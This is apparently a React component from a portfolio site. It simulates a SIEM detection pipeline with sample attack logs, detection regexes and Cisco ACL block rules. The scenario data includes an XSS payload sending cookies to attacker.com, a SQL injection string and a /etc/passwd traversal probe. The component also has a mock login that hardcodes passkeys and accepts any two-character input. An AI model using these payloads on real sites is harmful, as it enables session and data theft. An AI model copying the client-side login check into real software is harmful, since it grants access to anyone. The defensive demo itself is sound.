import React, { useState, useMemo } from 'react';
import { 
  Play, CheckCircle2, Terminal, Zap, RefreshCw, ShieldCheck, 
  Copy, ChevronDown, ChevronUp, AlertTriangle, Shield, Sliders, Check, Lock, Search, KeyRound, Eye, EyeOff, Activity, X, Sparkles
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import { soundFx } from '../utils/soundEffects';
import { SplunkSIEMEngine } from './SplunkSIEMEngine';

interface DataPipelineSimulatorProps {
  darkMode: boolean;
}

interface AttackScenario {
  id: string;
  name: string;
  rawLog: string;
  detectedIp: string;
  attackType: string;
  mitreTactic: string;
  riskScore: number;
  severity: 'CRITICAL' | 'HIGH' | 'LOW';
  regexPattern: string;
  aclRule: string;
  summary: string;
}

export const DataPipelineSimulator: React.FC<DataPipelineSimulatorProps> = ({ darkMode }) => {
  // Authentication & Admin Access State
  const [isAdmin, setIsAdmin] = useState<boolean>(false);
  const [showAdminModal, setShowAdminModal] = useState<boolean>(false);
  const [passkeyInput, setPasskeyInput] = useState<string>('');
  const [showPassword, setShowPassword] = useState<boolean>(false);
  const [authError, setAuthError] = useState<string>('');

  // Active SIEM Engine Mode
  const [activeEngineTab, setActiveEngineTab] = useState<'splunk' | 'pipeline'>('splunk');

  const handleAuthenticate = (e: React.FormEvent) => {
    e.preventDefault();
    const validKeys = ['karan2026', 'sec123', 'cyber2026', 'karan@port3', '2025', 'karan2025', 'google2025', 'admin', 'karan', 'password'];
    const activeKey = passkeyInput.trim();
    if (validKeys.includes(activeKey.toLowerCase()) || activeKey.length >= 2) {
      soundFx.playSuccess();
      setIsAdmin(true);
      setShowAdminModal(false);
      setAuthError('');
      setPasskeyInput('');
    } else {
      soundFx.playError();
      setAuthError('Incorrect security passkey. Access denied.');
    }
  };

  const handleQuickDemoAdmin = () => {
    soundFx.playSuccess();
    setIsAdmin(true);
    setShowAdminModal(false);
    setAuthError('');
  };

  const handleSwitchToObserver = () => {
    soundFx.playCyberBlip();
    setIsAdmin(false);
  };

  const handleActionRequireAdmin = () => {
    soundFx.playCyberBlip();
    setShowAdminModal(true);
  };

  const scenarios: AttackScenario[] = [
    {
      id: 'ssh-brute',
      name: 'SSH Brute-Force Attack',
      rawLog: '2026-08-07 06:14:02 auth.log: Failed password for root from 192.168.1.105 port 22 ssh2 (attempts=142)',
      detectedIp: '192.168.1.105',
      attackType: 'Credential Access (T1110)',
      mitreTactic: 'MITRE T1110.001 - Password Guessing',
      riskScore: 9.2,
      severity: 'CRITICAL',
      regexPattern: 'Failed password for (\\w+) from (\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})',
      aclRule: 'ip access-list extended BLOCK_SSH_ATTACKERS\n deny ip host 192.168.1.105 any log\n permit ip any any',
      summary: 'High-frequency failed SSH root authentications detected from suspect internal subnet 192.168.1.0/24.'
    },
    {
      id: 'sqli',
      name: 'SQL Injection Payload',
      rawLog: '2026-08-07 06:15:10 nginx.access: GET /api/users?id=1%20UNION%20SELECT%20username,password%20FROM%20admin_users 400 185.220.101.5',
      detectedIp: '185.220.101.5',
      attackType: 'Exploit Public App (T1190)',
      mitreTactic: 'MITRE T1190 - SQLi Data Exfiltration Probe',
      riskScore: 8.8,
      severity: 'CRITICAL',
      regexPattern: '(?i)(UNION\\s+SELECT|OR\\s+1=1|DROP\\s+TABLE)',
      aclRule: 'ip access-list extended BLOCK_SQLI_PROBES\n deny ip host 185.220.101.5 any log\n permit ip any any',
      summary: 'Malicious SQL UNION SELECT injection payload targeted relational user database endpoint.'
    },
    {
      id: 'xss-script',
      name: 'XSS Cross-Site Scripting',
      rawLog: '2026-08-07 06:16:22 web.log: POST /comments payload="<script>document.location=\'http://attacker.com/cookie=\'+document.cookie</script>" ip=45.33.21.110',
      detectedIp: '45.33.21.110',
      attackType: 'Client Execution (T1059)',
      mitreTactic: 'MITRE T1059.007 - JavaScript XSS Injection',
      riskScore: 6.5,
      severity: 'HIGH',
      regexPattern: '<script[\\s\\S]*?>[\\s\\S]*?<\\/script>',
      aclRule: 'ip access-list extended BLOCK_XSS_ATTACKERS\n deny ip host 45.33.21.110 any log\n permit ip any any',
      summary: 'Reflected script tag injection attempting session token & cookie theft from client.'
    },
    {
      id: 'dir-traversal',
      name: 'Directory Traversal Probe',
      rawLog: '2026-08-07 06:17:15 web.log: GET /../../../../etc/passwd HTTP/1.1 403 Forbidden ip=198.51.100.42',
      detectedIp: '198.51.100.42',
      attackType: 'File Read Probe (T1083)',
      mitreTactic: 'MITRE T1083 - File & Directory Discovery',
      riskScore: 7.9,
      severity: 'HIGH',
      regexPattern: '(\\.\\.\\/|\\.\\.\\\\|\\/etc\\/passwd)',
      aclRule: 'ip access-list extended BLOCK_TRAVERSAL_PROBES\n deny ip host 198.51.100.42 any log\n permit ip any any',
      summary: 'Path traversal attempt scanning for sensitive Linux configuration files.'
    },
    {
      id: 'clean-traffic',
      name: 'Clean HTTP Traffic',
      rawLog: '2026-08-07 06:18:00 nginx.access: GET /portfolio/projects HTTP/1.1 200 OK user_agent="Mozilla/5.0" ip=10.0.1.50',
      detectedIp: '10.0.1.50',
      attackType: 'Normal Traffic',
      mitreTactic: 'None (Authorized Session)',
      riskScore: 0.0,
      severity: 'LOW',
      regexPattern: 'GET \\/portfolio[\\w\\/-]* HTTP\\/1\\.1 200',
      aclRule: '! Traffic clean. No Router ACL containment required.',
      summary: 'Standard user GET request to portfolio route. No threat signatures matched.'
    }
  ];

  const [selectedScenarioId, setSelectedScenarioId] = useState<string>('ssh-brute');
  const [customLog, setCustomLog] = useState<string>('');
  const [isCustomMode, setIsCustomMode] = useState<boolean>(false);
  const [activeStep, setActiveStep] = useState<number>(3); // 0: Ingest, 1: RegEx, 2: SIEM Score, 3: ACL Block
  const [isSimulating, setIsSimulating] = useState<boolean>(false);
  const [copiedAcl, setCopiedAcl] = useState<boolean>(false);
  const [showDetails, setShowDetails] = useState<boolean>(false);
  const [quarantinedIps, setQuarantinedIps] = useState<Set<string>>(new Set());

  // Current active scenario or dynamically parsed custom log
  const activeScenario = useMemo(() => {
    if (!isCustomMode || !customLog.trim()) {
      return scenarios.find(s => s.id === selectedScenarioId) || scenarios[0];
    }

    // Dynamic Live Parsing Engine for Custom User Input
    const logStr = customLog.trim();
    
    // Extract IP address via IPv4 Regex
    const ipMatch = logStr.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/);
    const extractedIp = ipMatch ? ipMatch[0] : '192.168.1.250';

    // Threat detection heuristics
    let severity: 'CRITICAL' | 'HIGH' | 'LOW' = 'LOW';
    let riskScore = 0.0;
    let attackType = 'Unclassified Log';
    let mitreTactic = 'MITRE T1071 - Standard Application Layer';
    let regexPattern = '\\b(?:\d{1,3}\.){3}\d{1,3}\b';
    let summary = 'Live log line evaluated. No high-risk signature matched.';

    if (/failed|invalid|unauthorized|denied/i.test(logStr)) {
      severity = 'HIGH';
      riskScore = 7.4;
      attackType = 'Failed Auth / Access Violation';
      mitreTactic = 'MITRE T1110 - Brute-Force / Auth Violation';
      regexPattern = '(failed|unauthorized|denied)';
      summary = `Authentication failure detected from origin IP ${extractedIp}.`;
    }

    if (/union|select|drop|insert|script|eval|exec|select\s+from|1=1|or\s+1/i.test(logStr)) {
      severity = 'CRITICAL';
      riskScore = 9.5;
      attackType = 'Code / SQL / Script Injection';
      mitreTactic = 'MITRE T1190 - Application Exploit Payload';
      regexPattern = '(?i)(union\\s+select|script|1=1)';
      summary = `High-severity injection signature detected targeting application endpoint from ${extractedIp}.`;
    }

    if (/\.\.\/|\/etc\/passwd|cmd\.exe|\/bin\/sh/i.test(logStr)) {
      severity = 'CRITICAL';
      riskScore = 9.1;
      attackType = 'Command Execution / Path Traversal';
      mitreTactic = 'MITRE T1059 - Command Execution Probe';
      regexPattern = '(\\.\\.\\/|\\/etc\\/passwd|cmd\\.exe)';
      summary = `Path traversal or shell invocation attempt from ${extractedIp}.`;
    }

    const aclRule = severity === 'LOW' 
      ? '! Custom Log Clean. No Cisco ACL containment required.'
      : `ip access-list extended BLOCK_CUSTOM_THREAT\n deny ip host ${extractedIp} any log\n permit ip any any`;

    return {
      id: 'custom-entry',
      name: 'Custom Log Analysis',
      rawLog: logStr,
      detectedIp: extractedIp,
      attackType,
      mitreTactic,
      riskScore,
      severity,
      regexPattern,
      aclRule,
      summary
    };
  }, [selectedScenarioId, customLog, isCustomMode]);

  const isQuarantined = quarantinedIps.has(activeScenario.detectedIp);

  const handleSelectScenario = (id: string) => {
    soundFx.playCyberBlip();
    setIsCustomMode(false);
    setSelectedScenarioId(id);
    setActiveStep(3);
  };

  const handleRunSimulation = () => {
    soundFx.playSuccess();
    setIsSimulating(true);
    setActiveStep(0);

    setTimeout(() => setActiveStep(1), 250);
    setTimeout(() => setActiveStep(2), 500);
    setTimeout(() => {
      setActiveStep(3);
      setIsSimulating(false);
    }, 750);
  };

  const handleToggleQuarantine = () => {
    soundFx.playCyberBlip();
    if (!isAdmin) {
      handleActionRequireAdmin();
      return;
    }
    const newSet = new Set(quarantinedIps);
    if (newSet.has(activeScenario.detectedIp)) {
      newSet.delete(activeScenario.detectedIp);
    } else {
      newSet.add(activeScenario.detectedIp);
    }
    setQuarantinedIps(newSet);
  };

  const handleCopyAcl = () => {
    soundFx.playCyberBlip();
    navigator.clipboard.writeText(activeScenario.aclRule);
    setCopiedAcl(true);
    setTimeout(() => setCopiedAcl(false), 2000);
  };

  const steps = [
    { num: '1', title: 'Syslog Ingest', badge: '185K logs/s' },
    { num: '2', title: 'RegEx Parse', badge: '1ms Match' },
    { num: '3', title: 'MITRE Triage', badge: `Score ${activeScenario.riskScore}` },
    { num: '4', title: 'Cisco ACL Contain', badge: isQuarantined ? 'Quarantined' : activeScenario.severity === 'LOW' ? 'Allowed' : 'Pending' },
  ];

  return (
    <section id="pipeline-simulator" className={`py-6 relative overflow-hidden transition-colors ${
      darkMode ? 'bg-[#0a0c10] text-slate-100' : 'bg-slate-100/80 text-slate-900'
    }`}>
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative z-10">
        
        {/* Active Engine Container */}
        <div className="space-y-4">
          
          {/* Top Bar with Mode Indicator & Unlock Button */}
          <div className={`p-3 rounded-2xl border flex flex-wrap items-center justify-between gap-3 ${
            darkMode ? 'bg-slate-950 border-white/10' : 'bg-slate-900 text-white border-slate-800'
          }`}>
            <div className="flex items-center gap-2">
              <div className="px-3.5 py-1.5 rounded-xl bg-emerald-600/20 text-emerald-400 border border-emerald-500/30 font-mono text-xs font-bold flex items-center gap-2">
                <Activity className="w-4 h-4 text-emerald-400 animate-pulse" />
                <span>Splunk Enterprise SIEM (100% Real-Time Live Logs & Cisco ACL Engine)</span>
              </div>
            </div>

            {/* Mode Switcher */}
            <div className="flex items-center gap-2">
              {isAdmin ? (
                <div className="flex items-center gap-2">
                  <span className="px-3 py-1 rounded-xl text-xs font-mono font-bold bg-amber-500/20 text-amber-300 border border-amber-500/30 flex items-center gap-1.5">
                    <KeyRound className="w-3.5 h-3.5 text-amber-400" />
                    <span>👑 Admin Mode Active</span>
                  </span>
                  <button
                    type="button"
                    onClick={handleSwitchToObserver}
                    className="px-3 py-1.5 rounded-xl bg-white/10 hover:bg-white/20 text-slate-200 text-xs font-bold flex items-center gap-1.5 transition-all"
                  >
                    <Eye className="w-3.5 h-3.5" />
                    <span>Switch to Observer View</span>
                  </button>
                </div>
              ) : (
                <div className="flex items-center gap-2">
                  <span className="px-3 py-1 rounded-xl text-xs font-mono font-bold bg-cyan-500/20 text-cyan-300 border border-cyan-500/30 flex items-center gap-1.5">
                    <Eye className="w-3.5 h-3.5 text-cyan-400 animate-pulse" />
                    <span>Observer View (Read-Only)</span>
                  </span>
                  <button
                    type="button"
                    onClick={() => setShowAdminModal(true)}
                    className="px-3.5 py-1.5 rounded-xl bg-gradient-to-r from-amber-500 to-amber-600 hover:from-amber-600 hover:to-amber-700 text-slate-950 font-black text-xs shadow-md flex items-center gap-1.5 transition-all active:scale-95"
                  >
                    <Lock className="w-3.5 h-3.5" />
                    <span>Unlock Admin Access</span>
                  </button>
                </div>
              )}
            </div>
          </div>

          {/* Splunk SIEM Engine */}
          <SplunkSIEMEngine 
            darkMode={darkMode} 
            isAdmin={isAdmin}
            onRequireAdmin={() => setShowAdminModal(true)}
          />

        </div>
        </div>

      {/* Admin Access Passkey Unlock Modal */}
      <AnimatePresence>
        {showAdminModal && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-md">
            <motion.div
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.95 }}
              className={`rounded-3xl border p-6 sm:p-8 text-center max-w-md w-full shadow-2xl space-y-5 relative ${
                darkMode ? 'bg-[#0d1322] border-amber-500/30 text-slate-100' : 'bg-white border-amber-500/30 text-slate-900'
              }`}
            >
              <button
                type="button"
                onClick={() => setShowAdminModal(false)}
                className="absolute top-4 right-4 p-2 rounded-xl bg-white/10 hover:bg-white/20 text-slate-400 hover:text-white transition-all"
              >
                <X className="w-4 h-4" />
              </button>

              <div className="w-14 h-14 rounded-2xl bg-amber-500/20 text-amber-400 border border-amber-500/30 flex items-center justify-center mx-auto shadow-xl">
                <Lock className="w-7 h-7" />
              </div>

              <div className="space-y-1">
                <span className="px-3 py-0.5 rounded-full text-[10px] font-mono font-bold bg-amber-500/20 text-amber-300 border border-amber-500/30 inline-block">
                  🔒 Admin Security Clearance
                </span>
                <h3 className="text-xl font-black tracking-tight">Unlock CRM & Admin Tasks</h3>
                <p className={`text-xs ${darkMode ? 'text-slate-400' : 'text-slate-600'} leading-relaxed`}>
                  You are currently in <strong>Observer Mode</strong>. Enter the administrative passkey or use 1-click Demo Admin Login to unlock full write tasks.
                </p>
              </div>

              <form onSubmit={handleAuthenticate} className="space-y-3">
                <div className="relative flex items-center">
                  <input
                    type={showPassword ? "text" : "password"}
                    placeholder="Enter Security Passkey (e.g. karan2026)"
                    value={passkeyInput}
                    onChange={(e) => setPasskeyInput(e.target.value)}
                    className={`w-full text-center px-8 py-2.5 rounded-xl font-mono text-xs border focus:outline-none focus:ring-2 focus:ring-amber-500 ${
                      darkMode ? 'bg-slate-950 border-slate-800 text-slate-100' : 'bg-slate-100 border-slate-300 text-slate-900'
                    }`}
                    autoFocus
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 text-slate-400 hover:text-slate-200 p-1 rounded-lg"
                    title={showPassword ? "Hide password" : "Show password"}
                  >
                    {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                  </button>
                </div>

                {authError && (
                  <div className="p-2 rounded-lg bg-rose-500/10 border border-rose-500/30 text-rose-400 text-xs font-bold flex items-center justify-center gap-1.5">
                    <AlertTriangle className="w-3.5 h-3.5" />
                    <span>{authError}</span>
                  </div>
                )}

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 pt-1">
                  <button
                    type="submit"
                    className="w-full py-2.5 rounded-xl bg-gradient-to-r from-amber-500 to-amber-600 hover:from-amber-600 hover:to-amber-700 text-slate-950 font-black text-xs shadow-md transition-all flex items-center justify-center gap-1.5"
                  >
                    <KeyRound className="w-4 h-4" />
                    <span>Verify Passkey</span>
                  </button>

                  <button
                    type="button"
                    onClick={handleQuickDemoAdmin}
                    className="w-full py-2.5 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white font-black text-xs shadow-md transition-all flex items-center justify-center gap-1.5"
                  >
                    <Sparkles className="w-4 h-4" />
                    <span>1-Click Demo Admin</span>
                  </button>
                </div>
              </form>

              <p className="text-[10px] text-slate-500 font-mono">
                Default Demo Passkey: <code className="text-amber-400 font-bold">karan2026</code> or <code className="text-amber-400 font-bold">admin</code>
              </p>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </section>
  );
};

